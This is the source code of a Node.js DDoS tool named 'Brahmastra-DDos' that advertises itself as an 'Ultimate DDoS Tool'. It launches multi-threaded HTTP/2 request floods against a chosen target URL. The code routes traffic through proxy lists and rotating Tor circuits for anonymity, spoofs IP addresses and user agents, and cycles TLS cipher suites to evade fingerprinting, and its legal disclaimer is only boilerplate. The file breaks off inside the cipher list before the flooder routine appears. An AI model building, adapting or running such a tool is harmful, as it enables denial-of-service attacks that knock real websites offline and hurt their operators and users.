const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const path = require("path");
const crypto = require("crypto");
const UserAgent = require('user-agents');
const fs = require("fs");
const axios = require('axios');
const https = require('https');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Enhanced error handling and process configuration
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Global error handler
process.on('uncaughtException', function (exception) {
    console.error(`[\x1b[31mERROR\x1b[0m] Uncaught Exception: ${exception.message}`);
    console.error(`[\x1b[31mERROR\x1b[0m] Stack: ${exception.stack}`);
});

process.on('unhandledRejection', function (reason, promise) {
    console.error(`[\x1b[31mERROR\x1b[0m] Unhandled Rejection at: ${promise}, reason: ${reason}`);
});

// Enhanced Tor Circuit Configuration
const TOR_CONFIG = {
    // Default Tor SOCKS proxy (usually runs on localhost:9050)
    defaultProxy: 'socks5://127.0.0.1:9050',
    // Circuit rotation interval in seconds
    circuitRotationInterval: 30,
    // Maximum circuits to use before rotation
    maxCircuits: 10,
    // Tor control port for circuit rotation (if available)
    controlPort: 9051,
    // Circuit rotation enabled by default
    enabled: false,
    // Connection timeout for Tor requests
    timeout: 10000,
    // Retry attempts for failed connections
    maxRetries: 3
};

// Tor Circuit Management
class TorCircuitManager {
    constructor() {
        this.currentCircuit = 0;
        this.circuitCount = 0;
        this.lastRotation = Date.now();
        this.agents = new Map();
        this.isEnabled = false;
    }

    // Enable Tor circuit rotation
    enable() {
        this.isEnabled = true;
        console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Tor Circuit Rotation Enabled`);
        console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Proxy: ${TOR_CONFIG.defaultProxy}`);
        console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Rotation Interval: ${TOR_CONFIG.circuitRotationInterval}s`);
    }

    // Disable Tor circuit rotation
    disable() {
        this.isEnabled = false;
        console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Tor Circuit Rotation Disabled`);
    }

    // Get current Tor SOCKS agent
    getCurrentAgent() {
        if (!this.isEnabled) {
            return null;
        }

        const circuitId = `circuit_${this.currentCircuit}`;
        
        if (!this.agents.has(circuitId)) {
            const agent = new SocksProxyAgent(TOR_CONFIG.defaultProxy);
            this.agents.set(circuitId, agent);
            this.circuitCount++;
        }

        return this.agents.get(circuitId);
    }

    // Rotate to next circuit
    rotateCircuit() {
        if (!this.isEnabled) return;

        const now = Date.now();
        if (now - this.lastRotation >= TOR_CONFIG.circuitRotationInterval * 1000) {
            this.currentCircuit = (this.currentCircuit + 1) % TOR_CONFIG.maxCircuits;
            this.lastRotation = now;
            
            // Clear old agents to force new connections
            this.agents.clear();
            
            console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Rotated to Circuit ${this.currentCircuit + 1}`);
        }
    }

    // Get circuit status
    getStatus() {
        return {
            enabled: this.isEnabled,
            currentCircuit: this.currentCircuit + 1,
            totalCircuits: this.circuitCount,
            lastRotation: this.lastRotation,
            nextRotation: this.lastRotation + (TOR_CONFIG.circuitRotationInterval * 1000)
        };
    }

    // Get current Tor IP address with enhanced retry logic
    async getTorIP() {
        if (!this.isEnabled) {
            throw new Error('Tor is not enabled');
        }

        try {
            const agent = this.getCurrentAgent();
            if (!agent) {
                throw new Error('Failed to get Tor agent');
            }

            // Use multiple IP checking services for redundancy
            const ipServices = [
                'https://httpbin.org/ip',
                'https://api.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];

            for (const service of ipServices) {
                for (let attempt = 1; attempt <= TOR_CONFIG.maxRetries; attempt++) {
                    try {
                        console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Attempting ${service} (attempt ${attempt}/${TOR_CONFIG.maxRetries})`);
                        
                        const response = await axios.get(service, { 
                            httpsAgent: agent,
                            timeout: TOR_CONFIG.timeout,
                            headers: {
                                'User-Agent': new UserAgent().toString()
                            }
                        });
                        
                        let ip = '';
                        if (service.includes('httpbin.org')) {
                            ip = response.data.origin;
                        } else if (service.includes('ipify.org')) {
                            ip = response.data.ip;
                        } else if (service.includes('ipinfo.io')) {
                            ip = response.data.ip;
                        }

                        if (ip) {
                            console.log(`[\x1b[32mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Successfully retrieved IP via ${service}`);
                            return {
                                ip: ip,
                                service: service,
                                circuit: this.currentCircuit + 1,
                                timestamp: new Date().toISOString(),
                                attempts: attempt
                            };
                        }
                    } catch (error) {
                        if (attempt === TOR_CONFIG.maxRetries) {
                            console.log(`[\x1b[33mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Failed to check IP via ${service} after ${TOR_CONFIG.maxRetries} attempts: ${error.message}`);
                        } else {
                            console.log(`[\x1b[33mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Attempt ${attempt} failed for ${service}: ${error.message}`);
                            // Wait before retry
                            await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
                        }
                        continue;
                    }
                }
            }
            
            throw new Error(`All IP checking services failed after ${TOR_CONFIG.maxRetries} attempts each`);
        } catch (error) {
            throw new Error(`Failed to get Tor IP: ${error.message}`);
        }
    }

    // Display current Tor IP information
    async showTorIP() {
        try {
            console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Checking current Tor IP address...`);
            const ipInfo = await this.getTorIP();
            
            console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Current Tor IP: \x1b[32m${ipInfo.ip}\x1b[0m`);
            console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Service: ${ipInfo.service}`);
            console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Circuit: ${ipInfo.circuit}`);
            console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Timestamp: ${ipInfo.timestamp}`);
            
            return ipInfo;
        } catch (error) {
            console.log(`[\x1b[31mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Error: ${error.message}`);
            return null;
        }
    }
}

// Initialize Tor Circuit Manager
const torManager = new TorCircuitManager();

// Enhanced argument parsing and help display
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxyFile: process.argv[6]
};

// Check for help flags
if (process.argv.includes('--help') || process.argv.includes('-h') || process.argv.includes('help')) {
    console.log(`\n🚀 Brahmastra-DDos v2.0.0 - Ultimate DDoS Tool`);
    console.log(`\n📖 Usage:`);
    console.log(`   node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> [options]`);
    console.log(`\n📋 Parameters:`);
    console.log(`   target     - Target URL (e.g., https://example.com)`);
    console.log(`   time       - Attack duration in seconds`);
    console.log(`   rate       - Requests per second per thread`);
    console.log(`   threads    - Number of concurrent threads`);
    console.log(`   proxy.txt  - Proxy list file`);
    console.log(`\n🆕 New Features:`);
    console.log(`   • Demo Mode: Safe simulation for testing`);
    console.log(`   • Tor Circuit Support: Anonymous routing`);
    console.log(`   • Tor IP Display: Show current Tor IP`);
    console.log(`   • Enhanced Error Handling & Retry Logic`);
    console.log(`   • Improved Proxy Management`);
    console.log(`\n🔧 Options:`);
    console.log(`   --demo           - Enable demo mode (safe simulation)`);
    console.log(`   --tor            - Enable Tor circuit routing`);
    console.log(`   --show-tor-ip    - Display current Tor exit node IP`);
    console.log(`   --tor-rotate=N   - Set Tor circuit rotation interval (seconds)`);
    console.log(`   --help, -h       - Show this help message`);
    console.log(`   --version        - Show version information`);
    console.log(`\n📚 Examples:`);
    console.log(`   • Demo: node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --demo`);
    console.log(`   • Tor: node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --tor`);
    console.log(`   • Tor IP: node Brahmastra-DDos.js --tor --show-tor-ip`);
    console.log(`   • Demo + Tor: node Brahmastra-DDos.js https://example.com 5 8 1 proxy.txt --demo --tor`);
    console.log(`\n📖 For detailed help, see README.md and guides`);
    console.log(`\n⚠️  Legal Notice: This tool is for educational and authorized testing purposes only.`);
    console.log(`   Users are responsible for ensuring compliance with applicable laws.`);
    process.exit();
}

// Check for version flag
if (process.argv.includes('--version') || process.argv.includes('-v')) {
    console.log(`\n🚀 Brahmastra-DDos v2.0.0`);
    console.log(`📅 Build Date: ${new Date().toISOString()}`);
    console.log(`🔧 Node.js: ${process.version}`);
    console.log(`💻 Platform: ${process.platform} ${process.arch}`);
    process.exit();
}

// Validate required arguments
if (process.argv.length < 7 && !process.argv.includes('--show-tor-ip')) {
    console.log(`\n🚀 Brahmastra-DDos v2.0.0 - Ultimate DDoS Tool`);
    console.log(`\n❌ Error: Insufficient arguments provided`);
    console.log(`\n📖 Usage: node Brahmastra-DDos.js <target> <time> <rate> <threads> <proxy.txt> [options]`);
    console.log(`\n💡 Tip: Use --help for detailed usage information`);
    process.exit(1);
}
const headers = {};

// Demo mode flag
const isDemoMode = process.argv.includes('demo') || process.argv.includes('--demo');

// Tor circuit flags
const isTorEnabled = process.argv.includes('--tor') || process.argv.includes('tor');
const torRotationArg = process.argv.find(arg => arg.startsWith('--tor-rotate='));
const torRotationInterval = torRotationArg ? parseInt(torRotationArg.split('=')[1]) : TOR_CONFIG.circuitRotationInterval;
const showTorIP = process.argv.includes('--show-tor-ip') || process.argv.includes('show-tor-ip');

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const getCurrentTime = () => {
   const now = new Date();
   const hours = now.getHours().toString().padStart(2, '0');
   const minutes = now.getMinutes().toString().padStart(2, '0');
   const seconds = now.getSeconds().toString().padStart(2, '0');
   return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
 };

 const targetURL = process.argv[2] || 'https://example.com';
 const agent = new https.Agent({ rejectUnauthorized: false });

 function getStatus() {
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('Request timed out'));
   }, 5000);
 });

 const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     const { status, data } = response;
     console.log(`[\x1b[35m-Brahmastra-DDos\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === 'Request timed out') {
       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} Request Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
     } else {
       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} ${error.message}`);
     }
   });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }

 // Demo mode function - simulates attack without sending real requests
 function runDemoMode() {
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Starting Demo Attack Simulation`);
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Target: ${args.target}`);
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Duration: ${args.time} seconds`);
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Rate: ${args.rate} requests/second`);
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Threads: ${args.threads}`);
  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Proxy File: ${args.proxyFile}`);
  
  // Show Tor status if enabled
  if (isTorEnabled) {
    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Tor Circuit Mode: ENABLED`);
    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Circuit Rotation: ${torRotationInterval}s`);
    
    // Show Tor IP if requested
    if (showTorIP) {
      setTimeout(async () => {
        console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Checking Tor IP address...`);
        await torManager.showTorIP();
      }, 2000);
    }
  }
  
  let requestCount = 0;
  let circuitCount = 0;
  const startTime = Date.now();
  let lastCircuitRotation = startTime;
  
  const demoInterval = setInterval(() => {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const remaining = args.time - elapsed;
    
    if (remaining <= 0) {
      clearInterval(demoInterval);
      console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Demo Attack Completed`);
      console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Total Simulated Requests: ${requestCount}`);
      if (isTorEnabled) {
        console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Total Circuit Rotations: ${circuitCount}`);
      }
      process.exit(0);
    }
    
    // Simulate circuit rotation if Tor is enabled
    if (isTorEnabled && (Date.now() - lastCircuitRotation) >= (torRotationInterval * 1000)) {
      circuitCount++;
      lastCircuitRotation = Date.now();
      console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Simulated Tor Circuit Rotation #${circuitCount}`);
    }
    
    // Simulate requests being sent
    for (let i = 0; i < args.rate; i++) {
      requestCount++;
      const fakeIP = ip_spoof();
      const fakeUserAgent = uap[Math.floor(Math.random() * uap.length)];
      
      if (requestCount % 100 === 0) {
        let logMessage = `[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Simulated ${requestCount} requests | Time remaining: ${remaining}s | Fake IP: ${fakeIP}`;
        if (isTorEnabled) {
          logMessage += ` | Circuit: ${circuitCount + 1}`;
        }
        console.log(logMessage);
      }
    }
  }, 1000);
  
  // Simulate status checks
  const statusInterval = setInterval(() => {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    if (elapsed >= args.time) {
      clearInterval(statusInterval);
      return;
    }
    
    let statusMessage = `[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Status Check - Target appears to be responding normally`;
    if (isTorEnabled) {
      const torStatus = torManager.getStatus();
      statusMessage += ` | Tor Circuit: ${torStatus.currentCircuit}`;
    }
    console.log(statusMessage);
  }, 2000);
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }

 function getRandomNumberBetween(min,max){
     return Math.floor(Math.random()*(max-min+1)+min);
 }

 function randomString(length) {
   var result = "";
   var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   var charactersLength = characters.length;
   for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   ;
   return result;
 }

 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
} 

 
 // Update args object with parsed values
args.target = process.argv[2];
args.time = ~~process.argv[3];
args.rate = ~~process.argv[4];
args.threads = ~~process.argv[5];
args.proxyFile = process.argv[6];


// Main execution logic
if (cluster.isMaster) {
  console.clear();
  console.log(`
  🚀 Brahmastra-DDos - Ultimate DDoS Tool v2.0.0
  🆕 Demo Mode | 🆕 Tor Circuit Support | 🆕 Tor IP Display | 🆕 Enhanced Features
`);
  
  // Display system information
  console.log(`\n💻 System Information:`);
  console.log(`   • Node.js Version: ${process.version}`);
  console.log(`   • Platform: ${process.platform}`);
  console.log(`   • Architecture: ${process.arch}`);
  console.log(`   • Memory: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB used`);
  console.log(`   • PID: ${process.pid}`);

  // Handle standalone Tor IP check
  if (showTorIP && !isDemoMode && !isTorEnabled) {
    console.log(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} --show-tor-ip requires --tor flag to be enabled`);
    console.log(`[\x1b[31mERROR\x1b[0m] ${getCurrentTime()} Usage: node Brahmastra-DDos.js target time rate thread proxy.txt --tor --show-tor-ip`);
    process.exit(1);
  }

  // Handle standalone Tor IP check (with Tor enabled but no attack)
  if (showTorIP && isTorEnabled && isDemoMode === false && process.argv.length === 7) {
    console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} Standalone Tor IP Check Mode`);
    console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} No attack will be performed`);
    
    TOR_CONFIG.circuitRotationInterval = torRotationInterval;
    torManager.enable();
    
    setTimeout(async () => {
      await torManager.showTorIP();
      console.log(`[\x1b[36mTOR IP CHECK\x1b[0m] ${getCurrentTime()} IP check completed. Exiting...`);
      process.exit(0);
    }, 3000);
    
    return;
  }
  
  // Enable Tor if flag is set
  if (isTorEnabled) {
    TOR_CONFIG.circuitRotationInterval = torRotationInterval;
    torManager.enable();
    console.log(`[\x1b[36mTOR CIRCUIT\x1b[0m] ${getCurrentTime()} Circuit Rotation Interval: ${torRotationInterval}s`);
    
    // Show Tor IP if requested
    if (showTorIP) {
      setTimeout(async () => {
        await torManager.showTorIP();
      }, 2000); // Wait 2 seconds for Tor to establish connection
    }
  }
  
  if (isDemoMode) {
    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Demo Mode Enabled - No real attacks will be performed`);
    console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} This is for educational and testing purposes only`);
    runDemoMode();
  } else {
    // Only create worker processes if not in demo mode
    for (let i = 1; i <= process.argv[5]; i++){
      cluster.fork();
      console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
    }
    console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
    
    // Start Tor circuit rotation if enabled
    if (isTorEnabled) {
      setInterval(() => {
        torManager.rotateCircuit();
      }, 1000);
    }
    
    setInterval(getStatus, 2000);
    setTimeout(() => {
      console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
      process.exit(1);
    }, process.argv[3] * 1000);
  }
} else if (!isDemoMode) {
  // Only run flooder in worker processes if not in demo mode
  setInterval(runFlooder);
}

const cplist = [
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
 "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
 "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
 "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
 "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
 "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
 ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
